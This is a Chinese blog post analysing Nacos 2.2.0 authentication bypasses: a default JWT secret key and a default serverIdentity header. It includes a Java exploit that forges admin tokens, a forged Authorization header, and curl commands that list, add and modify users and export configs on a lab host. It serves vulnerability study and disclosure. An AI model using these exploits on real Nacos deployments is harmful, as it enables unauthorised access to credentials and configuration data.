title: Nacos身份认证绕过漏洞分析
author: bmth
tags:
  - Nacos
categories:
  - java
top_img: 'https://img-blog.csdnimg.cn/a47fa56d59734849bc6536df1def5ef8.png'
cover: 'https://img-blog.csdnimg.cn/a47fa56d59734849bc6536df1def5ef8.png'
date: 2023-06-01 20:21:00
---
![](https://img-blog.csdnimg.cn/a47fa56d59734849bc6536df1def5ef8.png)

在2023的ciscn初赛中有一道Nacos配合Spring Cloud Gateway RCE的题，其实非常简单就是：[Nacos结合Spring Cloud Gateway RCE利用 ](https://xz.aliyun.com/t/11493)，然后配合CVE-2021-29441即可

其实近期还出现了一个认证漏洞，修复版本：[https://github.com/alibaba/nacos/releases/tag/2.2.0.1](https://github.com/alibaba/nacos/releases/tag/2.2.0.1)
![](https://img-blog.csdnimg.cn/edfc4d52b0214b17b3e00a48f023cd66.png)

在该版本中移除了默认鉴权插件中依赖的`nacos.core.auth.plugin.nacos.token.secret.key`默认值，来简单看一下


## 环境搭建
下载存在漏洞的版本：[https://github.com/alibaba/nacos/releases/tag/2.2.0](https://github.com/alibaba/nacos/releases/tag/2.2.0)
解压后执行
```bash
cd nacos/bin
#启动服务器
bash startup.sh -m standalone
#关闭服务器
bash shutdown.sh
```
随后访问`ip:8848/nacos`即可访问到web服务
![](https://img-blog.csdnimg.cn/9fc3be9afb674e2f9a93ea25fc3d38c6.png)

默认账号密码是nacos、nacos

修改startup.sh添加JVM远程调试
![](https://img-blog.csdnimg.cn/abaf1f257ffc4e91947341bc369f033a.png)

即可远程调试代码
## 漏洞分析
官方鉴权方面的文档：[https://nacos.io/zh-cn/docs/auth.html](https://nacos.io/zh-cn/docs/auth.html)
### JWT默认secretKey
我们查看一下配置文件`conf/application.properties`，发现`nacos.core.auth.plugin.nacos.token.secret.key`是一个默认值：
```
SecretKey012345678901234567890123456789012345678901234567890123456789
```
![](https://img-blog.csdnimg.cn/136bb819822c43949eb6152a0069ec42.png)

看到JWT加密的相关代码：`com.alibaba.nacos.plugin.auth.impl.JwtTokenManager#createToken(java.lang.String)`
![](https://img-blog.csdnimg.cn/0fc55f02b1e940bda08887b272be625a.png)

这里secretKey是一个默认的定值

接下来看到`com.alibaba.nacos.plugin.auth.impl.controller.UserController#login`登录逻辑中
![](https://img-blog.csdnimg.cn/ffc35c74c8e445c5870ddcd7f42edfd6.png)

如果配置文件中的`nacos.core.auth.system.type`为nacos或者ldap，就会进入`com.alibaba.nacos.plugin.auth.impl.NacosAuthManager#login`调用 resolveToken 和 validate0 函数对token进行认证
![](https://img-blog.csdnimg.cn/cfa6a2113a32490080d552b3f7204d8c.png)

resolveToken函数用于提取 Authorization 的值，若以Bearer开头，则取第7个字符以后的字符串返回
![](https://img-blog.csdnimg.cn/05de8413bdb248029ed57c7f0f57091c.png)

然后调用validate0函数用于校验JWT token
![](https://img-blog.csdnimg.cn/506512fcebcc4690a27aee46c7d76001.png)

知道了jwt的生成和校验逻辑、用户名以及jwt的默认私钥，就可以伪造jwt token了

exp：
```java
import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import io.jsonwebtoken.io.Decoders;
import io.jsonwebtoken.security.Keys;

import java.util.Date;

public class key {
    public static void main(String[] args) {
        System.out.println(createToken("nacos"));
    }

    public static String createToken(String userName) {
        String key = "SecretKey012345678901234567890123456789012345678901234567890123456789";
        long now = System.currentTimeMillis();
        Date validity = new Date(now + 18000*1000L);

        Claims claims = Jwts.claims().setSubject(userName);
        return Jwts.builder().setClaims(claims).setExpiration(validity).signWith(Keys.hmacShaKeyFor(Decoders.BASE64.decode(key)), SignatureAlgorithm.HS256).compact();
    }
}
```
得到：
```
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY4NTYxNzQ1MH0.IxrFfeyBRAyqMHBBWL_Njppkt1pq_OoOprQOI6ec5fY
```
![](https://img-blog.csdnimg.cn/a05656db6dd445d29864ace0eb8637eb.png)

成功绕过鉴权获取到用户信息

### 默认自定义身份识别标志
基于三梦师傅发现的bypass方式`User-Agent: Nacos-Server`，[https://github.com/alibaba/nacos/issues/4593](https://github.com/alibaba/nacos/issues/4593)，最后官方建议是启用新机制去代替，避免被非法访问
```
### If turn on auth system:
nacos.core.auth.enabled=true

### Since 1.4.1, Turn on/off white auth for user-agent: nacos-server, only for upgrade from old version.
nacos.core.auth.enable.userAgentAuthWhite=false

### Since 1.4.1, worked when nacos.core.auth.enabled=true and nacos.core.auth.enable.userAgentAuthWhite=false.
### The two properties is the white list for auth and used by identity the request from other server.
nacos.core.auth.server.identity.key=serverIdentity
nacos.core.auth.server.identity.value=security
```
但是如果用户只开启了鉴权，并没有修改默认的key以及value的值，我们就可以利用这个bypass

鉴权的代码在`com.alibaba.nacos.core.auth.AuthFilter#doFilter`
![](https://img-blog.csdnimg.cn/5dcfadc1ff9a4288abd9b023deda8090.png)

可以看到如果成功匹配到了`application.properties`配置文件中的`nacos.core.auth.server.identity.key`以及`nacos.core.auth.server.identity.value`的值，就可以跳过鉴权

请求时加上header `serverIdentity: security`
![](https://img-blog.csdnimg.cn/98e11f1801a14ca480e5bf41ed504459.png)

成功绕过鉴权获取到用户信息
## 漏洞利用
我们可以通过官方文档找到许多可利用的接口：[https://nacos.io/zh-cn/docs/open-api.html](https://nacos.io/zh-cn/docs/open-api.html)

版本探测：
`/v1/console/server/state`
![](https://img-blog.csdnimg.cn/c67c4bdf23d8418a93a8d3857c54fae0.png)

然后最为人所知的poc就是(未开启auth)：
```
读取用户账号密码:
curl -X GET "http://192.168.111.178:8848/nacos/v1/auth/users?pageNo=1&pageSize=9&search=blur"

添加用户:
curl -X POST "http://192.168.111.178:8848/nacos/v1/auth/users?username=test&password=test"

任意用户密码更改:
curl -X PUT "http://192.168.111.178:8848/nacos/v1/auth/users?username=test&newPassword=test1234"
```

其实还可以获取到Namespace列表：`/v1/console/namespaces`
![](https://img-blog.csdnimg.cn/318ff08c538c485381edb351842c4f6b.png)

获取到Namespace的配置信息：`/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99&tenant=dev`
![](https://img-blog.csdnimg.cn/03c05fdf608447dc973f83fe701a6ec4.png)

也可以将配置文件导出：`/v1/cs/configs?export=true&tenant=public&group=&appName=&ids=`

默认启动是不开启鉴权的，并且按照官方文档开启鉴权后，可以使用默认的 serverIdentity 和 JWT 两种方式进行绕过鉴权

参考：
[【安全记录】- Nacos accessToken 权限认证绕过漏洞及思考](https://zhuanlan.zhihu.com/p/602021283)
[nacos token.secret.key身份认证绕过漏洞(QVD-2023-6271) ](https://xz.aliyun.com/t/12313)
[Nacos 身份认证绕过漏洞QVD-2023-6271](https://mp.weixin.qq.com/s/YlLcUe8O_O-MZR1jWd3m7Q)
[nacos漏洞(CNVD-2023674205)复现&踩坑记录](https://www.anquanke.com/post/id/288930)
